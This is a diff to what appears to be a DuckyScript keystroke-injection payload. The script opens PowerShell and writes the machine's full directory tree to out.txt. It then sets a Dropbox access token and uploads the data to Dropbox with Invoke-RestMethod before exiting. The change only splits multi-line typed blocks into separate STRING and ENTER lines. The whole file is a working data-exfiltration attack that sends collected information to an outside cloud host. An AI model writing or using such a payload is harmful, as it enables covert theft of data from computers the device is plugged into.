@@ -20,7 +20,8 @@ STRING PowerShell
 ENTER
 DELAY 1000
 
-STRINGLN  tree /f /a > out.txt
+STRING tree /f /a > out.txt
+ENTER
 
 REM It depends byt the content and by the path choosen
 DELAY 5000
@@ -32,16 +33,22 @@ STRING $accessToken =
 STRING DROPBOX_ACCESS_TOKEN
 ENTER
 
-STRINGLN
-    $authHeader = @{Authorization = "Bearer $accessToken"}
-    $dropboxFilePath = "/out_exported.txt"
-
-    $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
-
-    $headers = @{}
-    $headers.Add("Authorization", "Bearer $accessToken")
-    $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
-    $headers.Add("Content-Type", "application/octet-stream")
-
-    Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $fileContent; exit;
-END_STRINGLN
+STRING     $authHeader = @{Authorization = "Bearer $accessToken"}
+ENTER
+STRING     $dropboxFilePath = "/out_exported.txt"
+ENTER
+ENTER
+STRING     $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+ENTER
+ENTER
+STRING     $headers = @{}
+ENTER
+STRING     $headers.Add("Authorization", "Bearer $accessToken")
+ENTER
+STRING     $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
+ENTER
+STRING     $headers.Add("Content-Type", "application/octet-stream")
+ENTER
+ENTER
+STRING     Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $fileContent; exit;
+ENTER
